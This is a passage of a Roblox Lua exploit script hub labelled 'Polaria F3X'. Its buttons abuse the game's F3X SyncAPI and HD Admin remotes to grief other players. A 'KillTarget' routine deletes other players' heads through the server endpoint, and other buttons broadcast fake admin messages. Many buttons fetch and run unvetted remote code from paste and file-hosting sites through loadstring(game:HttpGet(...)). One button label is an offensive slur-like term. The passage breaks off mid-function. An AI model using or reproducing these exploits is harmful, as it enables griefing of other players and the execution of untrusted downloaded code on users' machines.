--[ Polaria F3X by anonymoos11i11i1 V.7 Last version (I'm quiting this f3x exploits shit bro) ]--


--[ if you deobfuscate and see this message I want to say that scripting is never a easy thing for me I try to learn Lua learn to understand stuffs my self I can make a gui I can make a SYNCAPI script but it's all over nothing is left I tried several several times but the winner get to write history and not the loser this community is full of doxing and cyber crimes I can't believe this collapsing kids game can have this dark truth ai is a tool that created hundreds of skids on scriptblox and now people can't even identify what's ai and what's not I am very disappointed you act tuff while you can't do shit ]--


--[ Make sure your device is not a potato to run the maps properly ]--

--[ Printing (Very useless)]--
mystic.Size = UDim2.new(0, 104, 0, 29)
mystic.Font = Enum.Font.Arial
mystic.Text = "John Doe"
mystic.TextColor3 = Color3.fromRGB(255, 255, 255)
mystic.TextScaled = true
mystic.TextSize = 18.000
mystic.TextWrapped = true
mystic.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
    local char = player.Character
    local tool
    for i,v in player:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
    for i,v in game.ReplicatedStorage:GetDescendants() do
        if v.Name == "SyncAPI" then
            tool = v.Parent
        end
    end
   
    remote = tool.SyncAPI.ServerEndpoint
    function _(args)
        remote:InvokeServer(unpack(args))
    end


local function Color(part, color)
	local args = {
		"SyncColor",
		{
			{
				Part = part,
				Color = color,
				UnionColoring = false
			}
		}
	}
	_(args)
end

local function applyDecorationToPart(part) 
    
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire",
                ["Size"] = 3,
                ["Heat"] = 25,
                ["Color"] = Color3.fromRGB(255, 0, 0), 
                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
            } 
        } 
    }

    
    _(argsCreate)
    _(argsSync)
end

local function Parter(part) 
    
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Smoke"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Smoke",
                ["Size"] = 3,
                ["Color"] = Color3.fromRGB(255, 0, 0),  
            } 
        } 
    }

    
    _(argsCreate)
    _(argsSync)
end
local function eyePart(part) 
    
    local argsCreate = {
        [1] = "CreateDecorations",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire"
            }
        }
    }

   
    local argsSync = {
        [1] = "SyncDecorate",
        [2] = {
            [1] = {
                ["Part"] = part,
                ["DecorationType"] = "Fire",
                ["Size"] = 1,
                ["Heat"] = 12,
                ["Color"] = Color3.fromRGB(155, 0, 0), 
                ["SecondaryColor"] = Color3.fromRGB(255, 0, 0) 
            } 
        } 
    }

    
    _(argsCreate)
    _(argsSync)
end



local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification




local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()

    
RequestCommand:InvokeServer(";removeaccessories")
RequestCommand:InvokeServer(";titlebk me John Doe")

wait(1)
RequestCommand:InvokeServer(";hat me 107676946962151")
wait(0.5)
RequestCommand:InvokeServer(";hat me 18196403126")
wait(0.5)
RequestCommand:InvokeServer(";hat me 18801497637")
wait(0.5)
 RequestCommand:InvokeServer(";shirt me 100276101149100")
 RequestCommand:InvokeServer(";pants me 109662040845019")
RequestCommand:InvokeServer(";head me 0")
RequestCommand:InvokeServer(";face me 144075659")


wait(1)

local eye = char:FindFirstChild("Accessory (JohnEye)").Handle
local arm = char:FindFirstChild("Right Arm")
local tor = char:FindFirstChild("Torso")
local ar2 = char:FindFirstChild("Left Arm")

local RLeg = char:FindFirstChild("Right Leg")
local head = char:FindFirstChild("Head")
local LLeg = char:FindFirstChild("Left Leg")
applyDecorationToPart(arm)
applyDecorationToPart(ar2)
eyePart(eye)
Parter(tor)

Color(arm, Color3.fromRGB(252, 255, 150))
Color(ar2, Color3.fromRGB(252, 255, 150))
Color(head, Color3.fromRGB(252, 255, 150))
Color(tor, Color3.fromRGB(255, 255, 0))
Color(RLeg, Color3.fromRGB(0, 200, 255))
Color(LLeg, Color3.fromRGB(0, 200, 255))



local arm = character:FindFirstChild("Right Arm") 
local humanoid = character:FindFirstChildOfClass("Humanoid")


local isDead = false

humanoid.Died:Connect(function()
	isDead = true
end)


local animator = humanoid:FindFirstChildOfClass("Animator")

local attackAnim = Instance.new("Animation")
attackAnim.AnimationId = "rbxassetid://186934658"
local attackTrack = animator:LoadAnimation(attackAnim)

function KillTarget(target)
    if target and target.Character then
        local head = target.Character:FindFirstChild("Head")
        if head then
            local args = {
                [1] = "SetLocked",
                [2] = {
                    [1] = head
                },

                [3] = false
            }
            remote:InvokeServer(unpack(args))
            task.wait(0.1) 
            local args2 = {
                [1] = "Remove",
                [2] = {
                    [1] = head
                }
            }
            remote:InvokeServer(unpack(args2))
        end
    end
end


local function attack()
    attackTrack:Play() 
    local hitPlayer = nil
    local touchedConnection

    local function onTouch(other)
        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
        if otherPlayer and otherPlayer ~= player then
            hitPlayer = otherPlayer
        end
    end

    touchedConnection = arm.Touched:Connect(onTouch)
    task.wait(0.5)
    if touchedConnection then
        touchedConnection:Disconnect()
    end
    if hitPlayer then
               RequestCommand:InvokeServer(" ")
  
KillTarget(hitPlayer)
        task.wait(1)
        
    end

end


local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "AttackButtonGui"

local attackButton = Instance.new("TextButton")
attackButton.Name = "AttackButton"
attackButton.Parent = screenGui
attackButton.Size = UDim2.new(0, 160, 0, 50)
attackButton.Position = UDim2.new(0.5, -80, 1, -90)
attackButton.AnchorPoint = Vector2.new(0.5, 0)
attackButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
attackButton.TextColor3 = Color3.fromRGB(255, 255, 255)
attackButton.Font = Enum.Font.GothamBold
attackButton.Text = "attack"
attackButton.TextSize = 22
attackButton.AutoButtonColor = true
attackButton.ZIndex = 999


attackButton.MouseButton1Click:Connect(function()
	if not isDead then
		attack()
	end
end)



loadstring(game:HttpGet("https://gist.githubusercontent.com/Kotyara19k-Doorsspawner/ac3768adf302d0b28e71fc89ab46dcd4/raw/6ad0f8cc313a5541f884768c7f75abd62aee377e/John%2520Doe%2520Trial"))()

end)

dog.Name = "dog"
dog.Parent = scriptspage2
dog.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
dog.BorderColor3 = Color3.fromRGB(129, 26, 255)
dog.BorderSizePixel = 2
dog.Position = UDim2.new(0.752735257, 0, 0.0348278582, 0)
dog.Size = UDim2.new(0, 99, 0, 29)
dog.Font = Enum.Font.Arial
dog.Text = "Doggo Army"
dog.TextColor3 = Color3.fromRGB(255, 255, 255)
dog.TextScaled = true
dog.TextSize = 18.000
dog.TextWrapped = true
dog.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/umyNSGfy/raw"))()
end)

mosque_3.Name = "mosque"
mosque_3.Parent = scriptspage2
mosque_3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mosque_3.BorderColor3 = Color3.fromRGB(129, 26, 255)
mosque_3.BorderSizePixel = 2
mosque_3.Position = UDim2.new(0.0306345727, 0, 0.160714284, 0)
mosque_3.Size = UDim2.new(0, 104, 0, 29)
mosque_3.Font = Enum.Font.Arial
mosque_3.Text = "Mosque2"
mosque_3.TextColor3 = Color3.fromRGB(255, 255, 255)
mosque_3.TextScaled = true
mosque_3.TextSize = 18.000
mosque_3.TextWrapped = true
mosque_3.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/bNzaQ66f/raw"))()
wait(10)
loadstring(game:HttpGet("https://files.catbox.moe/8e8ivx.txt"))()
end)

ssp2.Name = "ssp 2"
ssp2.Parent = scriptspage2
ssp2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ssp2.BorderColor3 = Color3.fromRGB(129, 26, 255)
ssp2.BorderSizePixel = 2
ssp2.Position = UDim2.new(0.271334797, 0, 0.160714284, 0)
ssp2.Size = UDim2.new(0, 104, 0, 29)
ssp2.Font = Enum.Font.Arial
ssp2.Text = "Converted SSP"
ssp2.TextColor3 = Color3.fromRGB(255, 255, 255)
ssp2.TextScaled = true
ssp2.TextSize = 18.000
ssp2.TextWrapped = true
ssp2.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/k8wxil.txt"))()
end)

laser.Name = "laser"
laser.Parent = scriptspage2
laser.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
laser.BorderColor3 = Color3.fromRGB(129, 26, 255)
laser.BorderSizePixel = 2
laser.Position = UDim2.new(0.512035012, 0, 0.160714284, 0)
laser.Size = UDim2.new(0, 104, 0, 29)
laser.Font = Enum.Font.Arial
laser.Text = "Laser Gun"
laser.TextColor3 = Color3.fromRGB(255, 255, 255)
laser.TextScaled = true
laser.TextSize = 18.000
laser.TextWrapped = true
laser.MouseButton1Click:Connect(function()
rq:InvokeServer(";gear me 130113146")
end)

china.Name = "china"
china.Parent = scriptspage2
china.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
china.BorderColor3 = Color3.fromRGB(129, 26, 255)
china.BorderSizePixel = 2
china.Position = UDim2.new(0.752735257, 0, 0.159827858, 0)
china.Size = UDim2.new(0, 99, 0, 29)
china.Font = Enum.Font.Arial
china.Text = "Chinese Announcement"
china.TextColor3 = Color3.fromRGB(255, 255, 255)
china.TextScaled = true
china.TextSize = 18.000
china.TextWrapped = true
china.MouseButton1Click:Connect(function()
rq:InvokeServer(";sh This game has been blocked by the Chinese government")
end)

bean.Name = "bean"
bean.Parent = scriptspage2
bean.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bean.BorderColor3 = Color3.fromRGB(129, 26, 255)
bean.BorderSizePixel = 2
bean.Position = UDim2.new(0.0306345727, 0, 0.285714298, 0)
bean.Size = UDim2.new(0, 104, 0, 29)
bean.Font = Enum.Font.Arial
bean.Text = "Mr.Bean Admin (REAL VERSION)"
bean.TextColor3 = Color3.fromRGB(255, 255, 255)
bean.TextScaled = true
bean.TextSize = 18.000
bean.TextWrapped = true
bean.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/stus10.txt"))()
end)

patrik.Name = "patrik"
patrik.Parent = scriptspage2
patrik.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
patrik.BorderColor3 = Color3.fromRGB(129, 26, 255)
patrik.BorderSizePixel = 2
patrik.Position = UDim2.new(0.271334797, 0, 0.285714298, 0)
patrik.Size = UDim2.new(0, 104, 0, 29)
patrik.Font = Enum.Font.Arial
patrik.Text = "Patrick :0"
patrik.TextColor3 = Color3.fromRGB(255, 255, 255)
patrik.TextScaled = true
patrik.TextSize = 18.000
patrik.TextWrapped = true
patrik.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/gXiit5tE/raw"))()
end)

kitchen.Name = "kitchen"
kitchen.Parent = scriptspage2
kitchen.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
kitchen.BorderColor3 = Color3.fromRGB(129, 26, 255)
kitchen.BorderSizePixel = 2
kitchen.Position = UDim2.new(0.512035012, 0, 0.285714298, 0)
kitchen.Size = UDim2.new(0, 104, 0, 29)
kitchen.Font = Enum.Font.Arial
kitchen.Text = "Bombo Knife"
kitchen.TextColor3 = Color3.fromRGB(255, 255, 255)
kitchen.TextScaled = true
kitchen.TextSize = 18.000
kitchen.TextWrapped = true
kitchen.MouseButton1Click:Connect(function()
rq:InvokeServer(";gear me 121946387")
end)

virus.Name = "virus"
virus.Parent = scriptspage2
virus.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
virus.BorderColor3 = Color3.fromRGB(129, 26, 255)
virus.BorderSizePixel = 2
virus.Position = UDim2.new(0.752735257, 0, 0.284827858, 0)
virus.Size = UDim2.new(0, 99, 0, 29)
virus.Font = Enum.Font.Arial
virus.Text = "Infection"
virus.TextColor3 = Color3.fromRGB(255, 255, 255)
virus.TextScaled = true
virus.TextSize = 18.000
virus.TextWrapped = true
virus.MouseButton1Click:Connect(function()
rq:InvokeServer(";paint me white")
end)

rocky.Name = "rocky"
rocky.Parent = scriptspage2
rocky.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
rocky.BorderColor3 = Color3.fromRGB(129, 26, 255)
rocky.BorderSizePixel = 2
rocky.Position = UDim2.new(0.0306345727, 0, 0.418692946, 0)
rocky.Size = UDim2.new(0, 104, 0, 29)
rocky.Font = Enum.Font.Arial
rocky.Text = "Rocky2u's Admin"
rocky.TextColor3 = Color3.fromRGB(255, 255, 255)
rocky.TextScaled = true
rocky.TextSize = 18.000
rocky.TextWrapped = true
rocky.MouseButton1Click:Connect(function()
str_srce = "14682300022" loadstring(game:GetObjects("rbxassetid://"..str_srce)[1].Source)()
end)

yield.Name = "yield"
yield.Parent = scriptspage2
yield.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
yield.BorderColor3 = Color3.fromRGB(129, 26, 255)
yield.BorderSizePixel = 2
yield.Position = UDim2.new(0.512035012, 0, 0.418692887, 0)
yield.Size = UDim2.new(0, 104, 0, 29)
yield.Font = Enum.Font.Arial
yield.Text = "[FE] Infinite Yield"
yield.TextColor3 = Color3.fromRGB(255, 255, 255)
yield.TextScaled = true
yield.TextSize = 18.000
yield.TextWrapped = true
yield.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/346cpb.txt"))()
end)

cina.Name = "cina"
cina.Parent = scriptspage2
cina.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
cina.BorderColor3 = Color3.fromRGB(129, 26, 255)
cina.BorderSizePixel = 2
cina.Position = UDim2.new(0.752735257, 0, 0.41697073, 0)
cina.Size = UDim2.new(0, 99, 0, 29)
cina.Font = Enum.Font.Arial
cina.Text = "China"
cina.TextColor3 = Color3.fromRGB(255, 255, 255)
cina.TextScaled = true
cina.TextSize = 18.000
cina.TextWrapped = true
cina.MouseButton1Click:Connect(function()
rq:InvokeServer(";music 121922837560201 ;pitch 0.221 ;volume inf")
loadstring(game:HttpGet("https://gist.github.com/Kotyara19k-Doorsspawner/01f820adf9cd307fa1032d3f03235ea3/raw/491f81d1f01c727b137001313da62695f5101be3/gistfile1.txt"))()
end)

mc.Name = "mc"
mc.Parent = scriptspage2
mc.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mc.BorderColor3 = Color3.fromRGB(129, 26, 255)
mc.BorderSizePixel = 2
mc.Position = UDim2.new(0.0306345727, 0, 0.543692887, 0)
mc.Size = UDim2.new(0, 104, 0, 29)
mc.Font = Enum.Font.Arial
mc.Text = "Steve"
mc.TextColor3 = Color3.fromRGB(255, 255, 255)
mc.TextScaled = true
mc.TextSize = 18.000
mc.TextWrapped = true
mc.MouseButton1Click:Connect(function()
rq:InvokeServer(";r15")
wait(1)
rq:InvokeServer(";char me q_rc7")
wait(1)
rq:InvokeServer(";bundle me 46771")
wait(1)
rq:InvokeServer(";shirt me 16512333409")
wait(1)
rq:InvokeServer(";pants me 14955922682")
wait(1)
loadstring(game:HttpGet("https://pastebin.com/raw/pJ7r63eC"))()
rq:InvokeServer(";head me 0")
wait(1)
rq:InvokeServer(";hat me 128875258353354")
loadstring(game:HttpGet("https://pastebin.com/raw/X6XxjFbx"))()
local player = game.Players.LocalPlayer
local Character = player.Character or player.CharacterAdded:Wait()
local HMD = Character.HumanoidRootPart

function GitAud(soundgit,filename)
    SoundName=tostring(SoundName)
    local url=soundgit
    local FileName = filename
    writefile(FileName..".mp3", game:HttpGet(url))
    return (getcustomasset or getsynasset)(FileName..".mp3")
end

function CustomGitSound(soundlink, vol, filename)
local BGMusic = Instance.new("Sound")
    BGMusic.SoundId = GitAud(soundlink, filename)
    BGMusic.Parent = HMD
    BGMusic.Volume = 2
    BGMusic.Name = "BGM_MUSIC"
    BGMusic.Looped = true
    BGMusic:Play()
end




local player = game.Players.LocalPlayer
local char = player.Character
local tool
for i,v in player:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end
for i,v in game.ReplicatedStorage:GetDescendants() do
    if v.Name == "SyncAPI" then
        tool = v.Parent
    end
end

remote = tool.SyncAPI.ServerEndpoint
function _(args)
    remote:InvokeServer(unpack(args))
end

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification

local player = Players.LocalPlayer

local character = player.Character or player.CharacterAdded:Wait()


local arm = character:FindFirstChild("Right Arm")
local humanoid = character:FindFirstChildOfClass("Humanoid")


local isDead = false

humanoid.Died:Connect(function()
	isDead = true
end)


local animator = humanoid:FindFirstChildOfClass("Animator")

local attackAnim = Instance.new("Animation")
attackAnim.AnimationId = "rbxassetid://110361063508944"
local attackTrack = animator:LoadAnimation(attackAnim)
attackTrack.Priority = Enum.AnimationPriority.Action


function KillTarget(target)
    if target and target.Character then
        local head = target.Character:FindFirstChild("Head")
        if head then
            local args = {
                [1] = "SetLocked",
                [2] = {
                    [1] = head
                },

                [3] = false
            }
            remote:InvokeServer(unpack(args))
            task.wait(0.1) 
            local args2 = {
                [1] = "Remove",
                [2] = {
                    [1] = head
                }
            }
            remote:InvokeServer(unpack(args2))
        end
    end
end


local function attack()
    attackTrack:Play() 
    local hitPlayer = nil
    local touchedConnection

    local function onTouch(other)
        local otherPlayer = Players:GetPlayerFromCharacter(other.Parent)
        if otherPlayer and otherPlayer ~= player then
            hitPlayer = otherPlayer
        end
    end

    touchedConnection = arm.Touched:Connect(onTouch)
    task.wait(0.5)
    if touchedConnection then
        touchedConnection:Disconnect()
    end
    if hitPlayer then
               RequestCommand:InvokeServer(" ")
        KillTarget(hitPlayer)
        wait(1)
        
    end

end

UserInputService.TouchStarted:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if isDead then return end 
    attack()
end)
end)

c4.Name = "c4"
c4.Parent = scriptspage2
c4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
c4.BorderColor3 = Color3.fromRGB(129, 26, 255)
c4.BorderSizePixel = 2
c4.Position = UDim2.new(0.271334797, 0, 0.543692887, 0)
c4.Size = UDim2.new(0, 104, 0, 29)
c4.Font = Enum.Font.Arial
c4.Text = "Airstrike"
c4.TextColor3 = Color3.fromRGB(255, 255, 255)
c4.TextScaled = true
c4.TextSize = 18.000
c4.TextWrapped = true
c4.MouseButton1Click:Connect(function()
rq:InvokeServer(";gear me 88885539")
end)

summon.Name = "summon"
summon.Parent = scriptspage2
summon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
summon.BorderColor3 = Color3.fromRGB(129, 26, 255)
summon.BorderSizePixel = 2
summon.Position = UDim2.new(0.512035012, 0, 0.543692887, 0)
summon.Size = UDim2.new(0, 104, 0, 29)
summon.Font = Enum.Font.Arial
summon.Text = "Spawn N*obs"
summon.TextColor3 = Color3.fromRGB(255, 255, 255)
summon.TextScaled = true
summon.TextSize = 18.000
summon.TextWrapped = true
summon.MouseButton1Click:Connect(function()
rq:InvokeServer(";insert 27410797")
end)

bv.Name = "bv"
bv.Parent = scriptspage2
bv.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bv.BorderColor3 = Color3.fromRGB(129, 26, 255)
bv.BorderSizePixel = 2
bv.Position = UDim2.new(0.752735257, 0, 0.541970849, 0)
bv.Size = UDim2.new(0, 99, 0, 29)
bv.Font = Enum.Font.Arial
bv.Text = "Goner"
bv.TextColor3 = Color3.fromRGB(255, 255, 255)
bv.TextScaled = true
bv.TextSize = 18.000
bv.TextWrapped = true
bv.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://files.catbox.moe/lr7247.txt"))()
end)

ploit.Name = "ploit"
ploit.Parent = scriptspage2
ploit.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
ploit.BorderColor3 = Color3.fromRGB(129, 26, 255)
ploit.BorderSizePixel = 2
ploit.Position = UDim2.new(0.271334797, 0, 0.41785714, 0)
ploit.Size = UDim2.new(0, 104, 0, 29)
ploit.Font = Enum.Font.Arial
ploit.Text = "Kiddnapp police"
ploit.TextColor3 = Color3.fromRGB(255, 255, 255)
ploit.TextScaled = true
ploit.TextSize = 18.000
ploit.TextWrapped = true
ploit.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/Qg93HAkl/raw"))()
end)

hamer.Name = "hamer"
hamer.Parent = scriptspage2
hamer.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
hamer.BorderColor3 = Color3.fromRGB(129, 26, 255)
hamer.BorderSizePixel = 2
hamer.Position = UDim2.new(0.0306345727, 0, 0.668692887, 0)
hamer.Size = UDim2.new(0, 104, 0, 29)
hamer.Font = Enum.Font.Arial
hamer.Text = "Sledge Hammer"
hamer.TextColor3 = Color3.fromRGB(255, 255, 255)
hamer.TextScaled = true
hamer.TextSize = 18.000
hamer.TextWrapped = true
hamer.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/aGPGIrjN/raw"))()
end)

baby.Name = "baby"
baby.Parent = scriptspage2
baby.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
baby.BorderColor3 = Color3.fromRGB(129, 26, 255)
baby.BorderSizePixel = 2
baby.Position = UDim2.new(0.271334797, 0, 0.668692887, 0)
baby.Size = UDim2.new(0, 104, 0, 29)
baby.Font = Enum.Font.Arial
baby.Text = "Dababy Car"
baby.TextColor3 = Color3.fromRGB(255, 255, 255)
baby.TextScaled = true
baby.TextSize = 18.000
baby.TextWrapped = true
baby.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/0QRXEbbv/raw"))()
end)

kik.Name = "kik"
kik.Parent = scriptspage2
kik.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
kik.BorderColor3 = Color3.fromRGB(129, 26, 255)
kik.BorderSizePixel = 2
kik.Position = UDim2.new(0.512035012, 0, 0.668692887, 0)
kik.Size = UDim2.new(0, 104, 0, 29)
kik.Font = Enum.Font.Arial
kik.Text = "Kick Gui --> PW: Free Scripts"
kik.TextColor3 = Color3.fromRGB(255, 255, 255)
kik.TextScaled = true
kik.TextSize = 18.000
kik.TextWrapped = true
kik.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/ZESwgTVK/raw"))()
end)

c0l.Name = "c0l"
c0l.Parent = scriptspage2
c0l.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
c0l.BorderColor3 = Color3.fromRGB(129, 26, 255)
c0l.BorderSizePixel = 2
c0l.Position = UDim2.new(0.752735257, 0, 0.668692887, 0)
c0l.Size = UDim2.new(0, 99, 0, 29)
c0l.Font = Enum.Font.Arial
c0l.Text = "c00lgui"
c0l.TextColor3 = Color3.fromRGB(255, 255, 255)
c0l.TextScaled = true
c0l.TextSize = 18.000
c0l.TextWrapped = true
c0l.MouseButton1Click:Connect(function()
loadstring(game:HttpGet('https://files.catbox.moe/scqhar.txt'))()
end)

nds.Name = "nds"
nds.Parent = scriptspage2
nds.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nds.BorderColor3 = Color3.fromRGB(129, 26, 255)
nds.BorderSizePixel = 2
nds.Position = UDim2.new(0.0306345727, 0, 0.793692887, 0)
nds.Size = UDim2.new(0, 104, 0, 29)
nds.Font = Enum.Font.Arial
nds.Text = "Natural Disaster Survival"
nds.TextColor3 = Color3.fromRGB(255, 255, 255)
nds.TextScaled = true
nds.TextSize = 18.000
nds.TextWrapped = true
nds.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/WLoE4bVy/raw"))()
end)

cart.Name = "cart"
cart.Parent = scriptspage2
cart.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
cart.BorderColor3 = Color3.fromRGB(129, 26, 255)
cart.BorderSizePixel = 2
cart.Position = UDim2.new(0.271334797, 0, 0.793692887, 0)
cart.Size = UDim2.new(0, 104, 0, 29)
cart.Font = Enum.Font.Arial
cart.Text = "Cart Ride"
cart.TextColor3 = Color3.fromRGB(255, 255, 255)
cart.TextScaled = true
cart.TextSize = 18.000
cart.TextWrapped = true
cart.MouseButton1Click:Connect(function()
loadstring(game:HttpGet("https://pastefy.app/4l4OTxQu/raw"))()
end)

GK.Name = "GK"
GK.Parent = scriptspage2
GK.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
GK.BorderColor3 = Color3.fromRGB(129, 26, 255)
GK.BorderSizePixel = 2
GK.Position = UDim2.new(0.512035012, 0, 0.793692887, 0)
GK.Size = UDim2.new(0, 104, 0, 29)
GK.Font = Enum.Font.Arial
GK.Text = "Grab Knife"
GK.TextColor3 = Color3.fromRGB(255, 255, 255)
GK.TextScaled = true
GK.TextSize = 18.000
GK.TextWrapped = true
GK.MouseButton1Click:Connect(function()
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandModification


local Players = game:GetService("Players")

local UserInputService = game:GetService("UserInputService")

if not character:FindFirstChild('Accessory (KNIF4ELERFTAccessory)') or character:FindFirstChild("Accessory (Knife McGrabbington III)") then
ready = false

local function notify(msg)
    local MainGUI = player:FindFirstChild("PlayerGui"):FindFirstChild("MainGUI")
    if not MainGUI then
        MainGUI = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
        MainGUI.Name = "MainGUI"
    end

    coroutine.wrap(function()
        for _, v in pairs(MainGUI:GetChildren()) do
            if v:IsA("TextLabel") then v:Destroy() end
        end

        local TextLabel = Instance.new("TextLabel")
        local Frame = Instance.new("Frame")

        TextLabel.Parent = MainGUI
        TextLabel.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
        TextLabel.BorderSizePixel = 0
        TextLabel.Position = UDim2.new(0.2, 0, 0.05, -10)
        TextLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
        TextLabel.Font = Enum.Font.SourceSans
        TextLabel.TextColor3 = Color3.new(1, 1, 1)
        TextLabel.TextSize = 35
        TextLabel.TextScaled = true
        TextLabel.TextYAlignment = Enum.TextYAlignment.Center
        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
        TextLabel.Text = ""
        TextLabel.BackgroundTransparency = 1

        Frame.Parent = TextLabel
        Frame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
        Frame.BorderSizePixel = 0
        Frame.Transparency = 1
        Frame.Position = UDim2.new(0, 0, 1, 0)
        Frame.Size = UDim2.new(1, 0, 0, 5)

        for i = 1, 8 do
            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency - 0.1
            TextLabel.Position = TextLabel.Position + UDim2.new(0, 0, 0, 1)
            Frame.Transparency = Frame.Transparency - 0.1
            task.wait()
        end

        msg = "  " .. msg
        for i = 1, #msg do
            TextLabel.Text = string.sub(msg, 1, i)
            task.wait()
        end

        task.wait(1)

        for i = 1, 8 do
            TextLabel.BackgroundTransparency = TextLabel.BackgroundTransparency + 0.1
            TextLabel.Position = TextLabel.Position - UDim2.new(0, 0, 0, 2)
            Frame.Transparency = Frame.Transparency + 0.1
